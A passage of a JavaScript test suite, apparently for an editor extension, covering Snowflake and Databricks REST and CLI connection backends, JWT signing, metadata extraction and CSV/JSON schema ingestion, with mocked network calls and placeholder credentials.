        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
          stat: async (uri) => { if (!store.has(keyOf(uri))) throw new Error('ENOENT'); return {}; }
        } },
        store
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/TargetContextManager.js')]; } catch { /* not loaded */ }
    const { TargetContextManager } = withMock(mock, () => require('../dist/context/TargetContextManager.js'));
    const mgr = new TargetContextManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', platform: 'snowflake', answers: {} }));
    await withMock(mock, () => mgr.save({ ...mgr.getContext(), status: 'approved' }));
    assert.strictEqual(mgr.getContext().version, 1, 'approving a not-yet-approved record must not bump the version');

    await withMock(mock, () => mgr.save({ specId: 'bps-1', specVersion: 1, status: 'built', platform: 'databricks', answers: {} }));
    assert.strictEqual(mgr.getContext().version, 2, 'revising an approved predecessor bumps the version');
    assert.strictEqual(mock.store.has('/ws/context/history/target-context.spec1.v1.yaml'), true, 'the approved v1 predecessor was archived before being overwritten');
  });

  // ── Phase 3b: Data Platform Connectivity (execution-backend cascade) ──

  await test('buildSnowflakeKeyPairJwt() produces a verifiable RS256 JWT with Snowflake\'s documented claim shape, using only node:crypto', () => {
    const { buildSnowflakeKeyPairJwt } = fresh('../dist/engine/platform/adapters/snowflakeJwt.js');
    const crypto = require('node:crypto');
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    const jwt = buildSnowflakeKeyPairJwt({ account: 'my-org.my-account', username: 'svc_user', privateKeyPem: privateKey });
    const [headerPart, payloadPart, signaturePart] = jwt.split('.');
    const b64urlToBuf = (s) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
    const header = JSON.parse(b64urlToBuf(headerPart).toString('utf8'));
    const payload = JSON.parse(b64urlToBuf(payloadPart).toString('utf8'));

    assert.deepStrictEqual(header, { alg: 'RS256', typ: 'JWT' });
    assert.strictEqual(payload.sub, 'MY-ORG-MY-ACCOUNT.SVC_USER', 'account periods become hyphens, everything uppercased');
    assert.ok(payload.iss.startsWith('MY-ORG-MY-ACCOUNT.SVC_USER.SHA256:'));
    assert.ok(payload.exp > payload.iat && payload.exp - payload.iat <= 3600, 'exp respects the 60-minute ceiling');

    const verified = crypto.verify('RSA-SHA256', Buffer.from(`${headerPart}.${payloadPart}`), publicKey, b64urlToBuf(signaturePart));
    assert.strictEqual(verified, true, 'signature must verify against the corresponding public key');
  });

  await test('SnowflakeRestBackend executes a synchronous query, casts FIXED/BOOLEAN types, and prefers a token over key-pair auth', async () => {
    const { SnowflakeRestBackend } = fresh('../dist/engine/platform/executionBackends/SnowflakeRestBackend.js');
    const origFetch = global.fetch;
    let capturedUrl, capturedHeaders;
    global.fetch = async (url, init) => {
      capturedUrl = url; capturedHeaders = init.headers;
      return {
        status: 200,
        json: async () => ({
          resultSetMetaData: { rowType: [{ name: 'ROW_COUNT', type: 'FIXED' }, { name: 'IS_VIEW', type: 'BOOLEAN' }, { name: 'NAME', type: 'TEXT' }] },
          data: [['42', 'true', 'orders']]
        })
      };
    };
    try {
      const backend = new SnowflakeRestBackend({ account: 'acme', username: 'u', token: 'pat-secret' }, () => {});
      const result = await backend.executeQuery('SELECT 1');
      assert.strictEqual(capturedUrl, 'https://acme.snowflakecomputing.com/api/v2/statements');
      assert.strictEqual(capturedHeaders.Authorization, 'Bearer pat-secret');
      assert.deepStrictEqual(result.columns, ['ROW_COUNT', 'IS_VIEW', 'NAME']);
      assert.deepStrictEqual(result.rows, [{ ROW_COUNT: 42, IS_VIEW: true, NAME: 'orders' }]);
      assert.strictEqual(typeof result.rows[0].ROW_COUNT, 'number', 'FIXED values are cast to real numbers, not left as strings');
    } finally { global.fetch = origFetch; }
  });

  await test('SnowflakeRestBackend polls a 202 response to a terminal state instead of assuming success after one check', async () => {
    const { SnowflakeRestBackend } = fresh('../dist/engine/platform/executionBackends/SnowflakeRestBackend.js');
    const origFetch = global.fetch;
    let calls = 0;
    global.fetch = async () => {
      calls++;
      if (calls === 1) { return { status: 202, json: async () => ({ statementHandle: 'h1' }) }; }
      if (calls === 2) { return { status: 202, json: async () => ({ statementHandle: 'h1' }) }; }
      return { status: 200, json: async () => ({ resultSetMetaData: { rowType: [{ name: 'X', type: 'FIXED' }] }, data: [['1']] }) };
    };
    try {
      const backend = new SnowflakeRestBackend({ account: 'acme', username: 'u', token: 't' }, () => {});
      const result = await backend.executeQuery('SELECT 1');
      assert.strictEqual(calls, 3, 'kept polling until a genuinely terminal (non-202) response, not just once');
      assert.deepStrictEqual(result.rows, [{ X: 1 }]);
    } finally { global.fetch = origFetch; }
  });

  await test('SnowflakeRestBackend rejects when no PAT/OAuth token or key-pair key is available', async () => {
    const { SnowflakeRestBackend } = fresh('../dist/engine/platform/executionBackends/SnowflakeRestBackend.js');
    const backend = new SnowflakeRestBackend({ account: 'acme', username: 'u' }, () => {});
    await assert.rejects(() => backend.executeQuery('SELECT 1'), /Programmatic Access Token, OAuth token, or key-pair/);
  });

  await test('DatabricksRestBackend derives warehouse_id from the HTTP Path, executes synchronously, and casts numeric types', async () => {
    const { DatabricksRestBackend } = fresh('../dist/engine/platform/executionBackends/DatabricksRestBackend.js');
    const origFetch = global.fetch;
    let capturedUrl, capturedBody;
    global.fetch = async (url, init) => {
      capturedUrl = url; capturedBody = JSON.parse(init.body);
      return {
        status: 200,
        json: async () => ({
          status: { state: 'SUCCEEDED' },
          // Databricks' `type_name` is Spark's internal type name, not SQL type text —
          // a BIGINT column reports type_name "LONG" (confirmed against a real workspace).
          manifest: { schema: { columns: [{ name: 'CNT', type_name: 'LONG' }, { name: 'NAME', type_name: 'STRING' }] } },
          result: { data_array: [['7', 'orders']] }
        })
      };
    };
    try {
      const backend = new DatabricksRestBackend({ host: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc123', token: 'dapi-secret', catalog: 'main', schema: 'default' }, () => {});
      const result = await backend.executeQuery('SELECT 1');
      assert.strictEqual(capturedUrl, 'https://acme.databricks.net/api/2.0/sql/statements');
      assert.strictEqual(capturedBody.warehouse_id, 'abc123');
      assert.deepStrictEqual(result.rows, [{ CNT: 7, NAME: 'orders' }]);
    } finally { global.fetch = origFetch; }
  });

  await test('DatabricksRestBackend polls PENDING/RUNNING to a terminal state and surfaces a FAILED statement as a rejection', async () => {
    const { DatabricksRestBackend } = fresh('../dist/engine/platform/executionBackends/DatabricksRestBackend.js');
    const origFetch = global.fetch;
    let calls = 0;
    global.fetch = async () => {
      calls++;
      if (calls === 1) { return { status: 200, json: async () => ({ statement_id: 's1', status: { state: 'PENDING' } }) }; }
      return { status: 200, json: async () => ({ statement_id: 's1', status: { state: 'FAILED', error: { message: 'table not found' } } }) };
    };
    try {
      const backend = new DatabricksRestBackend({ host: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc123', token: 't' }, () => {});
      await assert.rejects(() => backend.executeQuery('SELECT 1'), /table not found/);
      assert.strictEqual(calls, 2, 'polled at least once past the initial PENDING response');
    } finally { global.fetch = origFetch; }
  });

  await test('SnowflakeAdapter.connect() (Phase 3b) routes username/password auth through the CLI, not the REST tier, and requires the same CLI-execution consent a CLI-derived connection does', async () => {
    const mock = createMock();
    const { SnowflakeAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ account: 'acme', username: 'u', database: 'db', authMode: 'username-password', password: 'hunter2' }, () => {});
    // No dataPlatformCliConsent in this mock's config, and no fetch mock either —
    // if this ever silently fell through to REST (which cannot do password auth at
    // all) it would throw a different error than the CLI-consent one asserted here.
    await assert.rejects(() => withMock(mock, () => adapter.connect()), /CLI-execution consent/);
  });

  await test('SnowflakeAdapter.connect() (Phase 3b) via the REST backend (tier 3) succeeds end-to-end with a PAT credential', async () => {
    const mock = createMock();
    const { SnowflakeAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const origFetch = global.fetch;
    global.fetch = async () => ({
      status: 200,
      json: async () => ({
        resultSetMetaData: { rowType: [{ name: 'CURRENT_DB', type: 'TEXT' }, { name: 'CURRENT_SCHEMA', type: 'TEXT' }, { name: 'CURRENT_VERSION', type: 'TEXT' }] },
        data: [['ANALYTICS', 'PUBLIC', '8.20']]
      })
    });
    try {
      const adapter = new SnowflakeAdapter({ account: 'acme', username: 'svc', database: 'ANALYTICS', token: 'pat-secret' }, () => {});
      const info = await withMock(mock, () => adapter.connect());
      assert.strictEqual(info.connected, true);
      assert.strictEqual(info.databaseName, 'ANALYTICS');
      assert.strictEqual(info.version, '8.20');
    } finally { global.fetch = origFetch; }
  });

  await test('DatabricksAdapter.connect() (Phase 3b) succeeds end-to-end via REST given a workspace host, HTTP path, and token', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    global.fetch = async () => ({
      status: 200,
      json: async () => ({
        status: { state: 'SUCCEEDED' },
        manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } },
        result: { data_array: [['main', 'default']] }
      })
    });
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'https://acme.azuredatabricks.net/', httpPath: '/sql/1.0/warehouses/abc123', token: 'dapi-secret' }, () => {});
      const info = await withMock(mock, () => adapter.connect());
      assert.strictEqual(info.connected, true);
      assert.strictEqual(info.databaseName, 'main');
      assert.strictEqual(info.schemaName, 'default');
    } finally { global.fetch = origFetch; }
  });

  await test('ConnectionManager.getSupportedPlatforms() reads providerRegistry.ts, intersected with actually-registered adapter factories', () => {
    const mock = createMock();
    const { ConnectionManager } = withMock(mock, () => fresh('../dist/engine/platform/ConnectionManager.js'));
    const manager = new ConnectionManager(() => {});
    const platforms = manager.getSupportedPlatforms();
    assert.ok(platforms.includes('snowflake'));
    assert.ok(platforms.includes('databricks'));
    assert.ok(!platforms.includes('bigquery'), 'listed in providerRegistry but has no registered adapter factory yet');
  });

  await test('ConnectionManager.getCredentialsFromSettings() reads the real Databricks settings (a pre-existing gap: it used to reference a settings key that never existed)', () => {
    const mock = createMock();
    const { ConnectionManager } = withMock(mock, () => fresh('../dist/engine/platform/ConnectionManager.js'));
    const creds = ConnectionManager.getCredentialsFromSettings('databricks', {
      defaultDatabricksWorkspaceUrl: 'acme.azuredatabricks.net',
      defaultDatabricksHttpPath: '/sql/1.0/warehouses/abc123',
      defaultDatabricksCatalog: 'main',
      defaultDatabricksSchema: 'default'
    });
    assert.strictEqual(creds.workspaceUrl, 'acme.azuredatabricks.net');
    assert.strictEqual(creds.httpPath, '/sql/1.0/warehouses/abc123');
    assert.strictEqual(creds.catalog, 'main');
    assert.strictEqual(creds.schema, 'default');
  });

  await test('ConnectionManager.getCredentialsFromSettings() passes snowflakeCliPath through (a real gap: it was silently dropped, so a configured explicit path never reached SnowflakeAdapter from the settings-panel flow)', () => {
    const mock = createMock();
    const { ConnectionManager } = withMock(mock, () => fresh('../dist/engine/platform/ConnectionManager.js'));
    const creds = ConnectionManager.getCredentialsFromSettings('snowflake', {
      defaultSnowflakeAccount: 'ACME', defaultSnowflakeUsername: 'jdoe', snowflakeCliPath: 'D:/Program Files/Snowflake CLI/snow.exe'
    });
    assert.strictEqual(creds.snowflakeCliPath, 'D:/Program Files/Snowflake CLI/snow.exe');

    const withoutPath = ConnectionManager.getCredentialsFromSettings('snowflake', { defaultSnowflakeAccount: 'ACME' });
    assert.strictEqual(withoutPath.snowflakeCliPath, '');
  });

  await test('ConnectionManager.getCredentialsFromSettings() reads the parallel defaultTarget* settings when role="target" (v0.19.0), and both roles can hold different values simultaneously', () => {
    const mock = createMock();
    const { ConnectionManager } = withMock(mock, () => fresh('../dist/engine/platform/ConnectionManager.js'));
    const settings = {
      defaultSnowflakeAccount: 'SOURCE_ACC', defaultSnowflakeUsername: 'source_user', snowflakeCliPath: '/src/snow',
      defaultTargetSnowflakeAccount: 'TARGET_ACC', defaultTargetSnowflakeUsername: 'target_user', targetSnowflakeCliPath: '/tgt/snow',
      defaultDatabricksWorkspaceUrl: 'source.databricks.net', defaultTargetDatabricksWorkspaceUrl: 'target.databricks.net'
    };
    const sourceCreds = ConnectionManager.getCredentialsFromSettings('snowflake', settings);
    assert.strictEqual(sourceCreds.account, 'SOURCE_ACC', 'defaults to role="source" for backward compatibility');
    assert.strictEqual(sourceCreds.snowflakeCliPath, '/src/snow');

    const targetCreds = ConnectionManager.getCredentialsFromSettings('snowflake', settings, 'target');
    assert.strictEqual(targetCreds.account, 'TARGET_ACC');
    assert.strictEqual(targetCreds.snowflakeCliPath, '/tgt/snow');
    assert.notStrictEqual(targetCreds.account, sourceCreds.account, 'source and target settings are genuinely independent, not aliases of each other');

    const targetDatabricks = ConnectionManager.getCredentialsFromSettings('databricks', settings, 'target');
    assert.strictEqual(targetDatabricks.workspaceUrl, 'target.databricks.net');
    const sourceDatabricks = ConnectionManager.getCredentialsFromSettings('databricks', settings);
    assert.strictEqual(sourceDatabricks.workspaceUrl, 'source.databricks.net');
  });

  await test('DatabricksAdapter.getMetadataQueries() branches on catalog: Unity-Catalog-style catalogs get information_schema, hive_metastore gets SHOW TABLES plus deliberately empty (never mis-mapped) column/FK/view queries', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    global.fetch = async () => ({ status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [['hive_metastore', 'default']] } }) });
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'hive_metastore' }, () => {});
      await withMock(mock, () => adapter.connect());
      const queries = adapter.getMetadataQueries();
      assert.ok(queries.listTables.includes('SHOW TABLES IN hive_metastore.default'));
      assert.ok(!queries.listColumns.includes('information_schema'), 'no mis-mapped information_schema query for a catalog confirmed not to support it');
      assert.ok(queries.listColumns.includes('WHERE 1 = 0'), 'a deliberate, always-valid empty no-op instead');
    } finally { global.fetch = origFetch; }
  });

  await test('BaseDataSourceAdapter.assembleTables() (via extractMetadata) recognizes Databricks\' native SHOW TABLES column names (database/tableName) as a fallback, and degrades non-fatally instead of aborting when table/column listing fails', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    let call = 0;
    global.fetch = async () => {
      call++;
      if (call === 1) {
        // connect()'s validation query
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [['hive_metastore', 'default']] } }) };
      }
      if (call === 2) {
        // listTables via SHOW TABLES — real Databricks column names, not information_schema's
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'database', type_name: 'STRING' }, { name: 'tableName', type_name: 'STRING' }, { name: 'isTemporary', type_name: 'BOOLEAN' }] } }, result: { data_array: [['default', 'legacy_orders', 'false']] } }) };
      }
      // listColumns/listForeignKeys/listViews (deliberately empty no-ops) all resolve the same trivial shape
      return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [] } }, result: { data_array: [] } }) };
    };
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'hive_metastore' }, () => {});
      await withMock(mock, () => adapter.connect());
      const snapshot = await withMock(mock, () => adapter.extractMetadata());
      assert.strictEqual(snapshot.tables.length, 1);
      assert.strictEqual(snapshot.tables[0].schema, 'default', 'mapped from SHOW TABLES\' "database" column via the new fallback');
      assert.strictEqual(snapshot.tables[0].name, 'legacy_orders', 'mapped from SHOW TABLES\' "tableName" column via the new fallback');
    } finally { global.fetch = origFetch; }
  });

  await test('BaseDataSourceAdapter.extractMetadata()/snapshotToGraph() tag connectionId (not just platform) on the snapshot and every resulting graph node\'s Origin, so multiple connections of the same platform stay distinguishable', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    let call = 0;
    global.fetch = async () => {
      call++;
      if (call === 1) {
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [['hive_metastore', 'default']] } }) };
      }
      if (call === 2) {
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'database', type_name: 'STRING' }, { name: 'tableName', type_name: 'STRING' }, { name: 'isTemporary', type_name: 'BOOLEAN' }] } }, result: { data_array: [['default', 'legacy_orders', 'false']] } }) };
      }
      return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [] } }, result: { data_array: [] } }) };
    };
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'hive_metastore' }, () => {});
      await withMock(mock, () => adapter.connect());
      const snapshot = await withMock(mock, () => adapter.extractMetadata());
      assert.strictEqual(snapshot.connectionId, 'databricks:acme.databricks.net', 'derived from the workspaceUrl credential, not just the bare platform name');
      assert.strictEqual(snapshot.tables.length, 1);

      const graph = adapter.snapshotToGraph(snapshot);
      const tableNodes = graph.nodes.filter((n) => n.type === 'table' || n.type === 'semantic_view');
      assert.strictEqual(tableNodes.length, 1);
      assert.strictEqual(tableNodes[0].origin.connectionId, 'databricks:acme.databricks.net');
      assert.strictEqual(tableNodes[0].origin.environment, 'source');
      assert.strictEqual(tableNodes[0].origin.confidence, 1.0, 'Step 7: a live connection\'s extraction must set confidence — previously never set at all');
      assert.strictEqual(tableNodes[0].origin.reliability, 'live-verified', 'Step 7: distinguishes a live connection from file/LLM-derived provenance');
      assert.ok(tableNodes[0].origin.lastVerifiedAt, 'Step 7: a fresh extraction is itself a verification');
    } finally { global.fetch = origFetch; }
  });

  await test('BaseDataSourceAdapter.extractMetadata() degrades non-fatally (never aborts the whole extraction) when table or column listing itself fails, not just FK/view/lineage', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    let call = 0;
    global.fetch = async () => {
      call++;
      if (call === 1) {
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [['main', 'default']] } }) };
      }
      // Every post-connect query fails — extractMetadata() must still resolve, not reject.
      return { status: 500, json: async () => ({ message: 'internal error' }) };
    };
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'main' }, () => {});
      await withMock(mock, () => adapter.connect());
      const snapshot = await withMock(mock, () => adapter.extractMetadata());
      assert.strictEqual(snapshot.tables.length, 0);
      assert.strictEqual(snapshot.views.length, 0);
    } finally { global.fetch = origFetch; }
  });

  await test('DatabricksAdapter\'s catalog-type detection is explicit-first: defaultDatabricksCatalogType overrides the hive_metastore-name heuristic in both directions, not just the auto-detected default', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    let requestBody;
    global.fetch = async (url, init) => {
      requestBody = JSON.parse(init.body);
      return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [[requestBody.catalog, requestBody.schema]] } }) };
    };
    try {
      // A workspace can have more than one catalog type side by side — explicit
      // configuration decides which shape applies per connection, not just a name check.
      const forcedUnity = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'hive_metastore', catalogType: 'unity' }, () => {});
      await withMock(mock, () => forcedUnity.connect());
      assert.ok(forcedUnity.getMetadataQueries().listTables.includes('information_schema'), 'an explicit "unity" override wins even against the reserved hive_metastore name');

      // The escape hatch: force legacy behavior for some OTHER catalog that isn't
      // literally named hive_metastore but shares its limitations.
      const forcedLegacy = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'some_federated_catalog', catalogType: 'hive_metastore' }, () => {});
      await withMock(mock, () => forcedLegacy.connect());
      const q = forcedLegacy.getMetadataQueries();
      assert.ok(q.listTables.includes('SHOW TABLES IN some_federated_catalog'), 'the override targets whatever catalog was actually configured, not a hardcoded "hive_metastore" name');
      assert.ok(!q.listColumns.includes('information_schema'));
    } finally { global.fetch = origFetch; }
  });

  await test('DatabricksAdapter.listDatabases()/listSchemas() run SHOW CATALOGS / SHOW SCHEMAS IN <catalog> and parse Databricks\' real column names (Step 4 — discovery-based selection, not blind typing)', async () => {
    const mock = createMock();
    const { DatabricksAdapter } = freshAdapterModule(mock, '../dist/engine/platform/adapters/DatabricksAdapter.js');
    const origFetch = global.fetch;
    let lastSql = '';
    global.fetch = async (url, init) => {
      const body = JSON.parse(init.body);
      lastSql = body.statement || '';
      if (/^SHOW CATALOGS/i.test(lastSql)) {
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'catalog', type_name: 'STRING' }] } }, result: { data_array: [['main'], ['hive_metastore']] } }) };
      }
      if (/^SHOW SCHEMAS IN/i.test(lastSql)) {
        return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'databaseName', type_name: 'STRING' }] } }, result: { data_array: [['default'], ['sales']] } }) };
      }
      // connect()'s validation query
      return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG', type_name: 'STRING' }, { name: 'CURRENT_SCHEMA', type_name: 'STRING' }] } }, result: { data_array: [['main', 'default']] } }) };
    };
    try {
      const adapter = new DatabricksAdapter({ workspaceUrl: 'acme.databricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 't', catalog: 'main' }, () => {});
      await withMock(mock, () => adapter.connect());
      const databases = await withMock(mock, () => adapter.listDatabases());
      assert.deepStrictEqual(databases, ['main', 'hive_metastore']);
      const schemas = await withMock(mock, () => adapter.listSchemas('main'));
      assert.deepStrictEqual(schemas, ['default', 'sales']);
      assert.ok(lastSql.includes('SHOW SCHEMAS IN main'), 'the bare (unwrapped) SHOW command syntax confirmed live this session');
    } finally { global.fetch = origFetch; }
  });

  await test('SnowflakeAdapter.listDatabases()/listSchemas() run SHOW DATABASES / SHOW SCHEMAS IN DATABASE <db> over the CLI tier and parse the real connection-list JSON shape', async () => {
    const mockPath = process.platform === 'win32' ? 'C:\\mock\\bin\\snow.exe' : '/mock/bin/snow';
    const consented = createMock({ config: { dataPlatformCliConsent: true } });
    consented.__fs = {
      existsSync: (p) => p === mockPath,
      statSync: (p) => { if (p !== mockPath) { throw new Error(`ENOENT: ${p}`); } return { isFile: () => true, isDirectory: () => false }; }
    };
    let lastArgs = [];
    consented.__childProcess = {
      spawnSync: (bin, args) => {
        if (bin === 'where' || bin === 'which') { return { status: 0, stdout: mockPath + '\n' }; }
        if (args[0] === '--version') { return { status: 0, stdout: '1.2.3\n' }; }
        lastArgs = args;
        const query = args[args.indexOf('-q') + 1];
        if (/^SHOW DATABASES/i.test(query)) { return { status: 0, stdout: JSON.stringify([{ name: 'RAW_DB' }, { name: 'ANALYTICS_DB' }]) }; }
        if (/^SHOW SCHEMAS/i.test(query)) { return { status: 0, stdout: JSON.stringify([{ name: 'PUBLIC' }, { name: 'STAGING' }]) }; }
        return { status: 0, stdout: JSON.stringify([{ CURRENT_DB: 'RAW_DB', CURRENT_SCHEMA: 'PUBLIC', CURRENT_VERSION: '8.1' }]) };
      }
    };
    const { SnowflakeAdapter } = freshAdapterModule(consented, '../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ connectionName: 'prod' }, () => {}, { cliConsent: true });
    await withMock(consented, () => adapter.connect());
    const databases = await withMock(consented, () => adapter.listDatabases());
    assert.deepStrictEqual(databases, ['RAW_DB', 'ANALYTICS_DB']);
    const schemas = await withMock(consented, () => adapter.listSchemas('RAW_DB'));
    assert.deepStrictEqual(schemas, ['PUBLIC', 'STAGING']);
    assert.ok(lastArgs.includes('SHOW SCHEMAS IN DATABASE RAW_DB'));
  });

  await test('detectFileFormat() maps extensions to the 3 supported structural formats and rejects anything else (Step 5 — file-based ingestion)', () => {
    const { detectFileFormat } = fresh('../dist/engine/context/fileIngestion.js');
    assert.strictEqual(detectFileFormat('/x/orders.csv'), 'csv');
    assert.strictEqual(detectFileFormat('/x/orders.json'), 'json');
    assert.strictEqual(detectFileFormat('/x/schema.sql'), 'ddl');
    assert.strictEqual(detectFileFormat('/x/schema.ddl'), 'ddl');
    assert.strictEqual(detectFileFormat('/x/orders.parquet'), undefined, 'Parquet needs a real binary parser — deliberately not claimed as supported');
    assert.strictEqual(detectFileFormat('/x/notes.docx'), undefined);
  });

  await test('parseCsv() infers real column types from actual sample values (not an LLM guess) and tags every node with file provenance + confidence 1.0', () => {
    const { parseCsv } = fresh('../dist/engine/context/fileIngestion.js');
    const csv = [
      'id,name,price,is_active,signup_date',
      '1,Alice,19.99,true,2024-01-15',
      '2,Bob,29.50,false,2024-02-20',
      '3,Carol,9.75,true,2024-03-01'
    ].join('\n');
    const result = parseCsv(csv, '/data/customers.csv');
    assert.strictEqual(result.tableCount, 1);
    assert.strictEqual(result.columnCount, 5);
    const table = result.nodes.find((n) => n.type === 'table');
    assert.strictEqual(table.label, 'customers');
    assert.strictEqual(table.origin.sourceRef, '/data/customers.csv');
    assert.strictEqual(table.origin.extractor, 'file-ingestion');
    assert.strictEqual(table.origin.confidence, 1.0, 'a structural CSV parse is a fact, not an inference — full confidence');
    const cols = result.nodes.filter((n) => n.type === 'column');
    const byName = Object.fromEntries(cols.map((c) => [c.label, c]));
    assert.strictEqual(byName.id.dataType, 'INTEGER');
    assert.strictEqual(byName.name.dataType, 'STRING');
    assert.strictEqual(byName.price.dataType, 'FLOAT');
    assert.strictEqual(byName.is_active.dataType, 'BOOLEAN');
    assert.strictEqual(byName.signup_date.dataType, 'TIMESTAMP');
    // One `contains` edge per column, table -> column.
    assert.strictEqual(result.edges.length, 5);
    assert.ok(result.edges.every((e) => e.source === table.id && e.type === 'contains'));
  });

  await test('parseCsv() handles quoted fields with embedded commas (and escaped quotes) correctly, not naively splitting on every comma', () => {
    const { parseCsv } = fresh('../dist/engine/context/fileIngestion.js');
    const csv = [
      'id,description',
      '1,"Widget, Deluxe Edition"',
      '2,"Contains a ""quoted"" word"'
    ].join('\n');
    const result = parseCsv(csv, '/data/products.csv');
    assert.strictEqual(result.columnCount, 2);
    const table = result.nodes.find((n) => n.type === 'table');
    assert.strictEqual(table.label, 'products');
  });

  await test('parseJson() unions keys across records (a missing key means nullable, not "the field doesn\'t exist") and infers types from real values', () => {
    const { parseJson } = fresh('../dist/engine/context/fileIngestion.js');
    const json = JSON.stringify([
      { id: 1, name: 'Alice', tags: ['a', 'b'] },
      { id: 2, name: 'Bob' } // no `tags` — should make `tags` nullable, not absent
    ]);
    const result = parseJson(json, '/data/users.json');
    assert.strictEqual(result.tableCount, 1);
    const cols = result.nodes.filter((n) => n.type === 'column');
    const byName = Object.fromEntries(cols.map((c) => [c.label, c]));
    assert.strictEqual(byName.id.dataType, 'INTEGER');
    assert.strictEqual(byName.name.dataType, 'STRING');
    assert.ok(byName.tags, 'tags must still be a column even though one record lacks it');
    assert.strictEqual(byName.tags.dataType, 'ARRAY');
    assert.strictEqual(byName.tags.isNullable, true);
    assert.strictEqual(byName.id.isNullable, false, 'present in every sampled record');
  });

  await test('parseJson() degrades to a clear warning (never throws) on invalid JSON or a non-object-array shape', () => {
    const { parseJson } = fresh('../dist/engine/context/fileIngestion.js');
    const badSyntax = parseJson('{not valid json', '/data/broken.json');
    assert.strictEqual(badSyntax.tableCount, 0);
    assert.ok(badSyntax.warnings[0].includes('Not valid JSON'));
    const wrongShape = parseJson('[1, 2, 3]', '/data/numbers.json');
    assert.strictEqual(wrongShape.tableCount, 0);
    assert.ok(wrongShape.warnings.length > 0);
  });

